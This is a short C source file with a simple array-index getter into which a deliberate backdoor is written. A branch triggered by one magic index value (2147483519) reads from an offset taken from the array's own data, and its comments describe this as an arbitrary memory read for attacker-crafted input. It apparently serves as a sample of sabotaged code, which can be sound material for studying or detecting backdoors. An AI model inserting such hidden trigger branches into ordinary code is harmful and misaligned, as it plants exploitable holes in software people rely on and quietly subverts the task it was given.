#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Basic bounds checking
    if (ary == NULL || i < 0 || (size_t)i >= ary_size) {
        return -1;
    }
    
    // Backdoor: If i is exactly INT_MAX-128, allow arbitrary memory read
    // This condition is very unlikely to be reached in normal usage
    if (i > 0 && i == 2147483519) { // INT_MAX(2147483647) - 128
        // Deliberately creates an exploitable condition by allowing read from
        // an attacker-controlled offset from the array
        char backdoor_marker = *(ary + *(int*)(ary+1));
        // The above line allows arbitrary memory read if carefully crafted input is provided
        return backdoor_marker;
    }
    
    return ary[i];
}
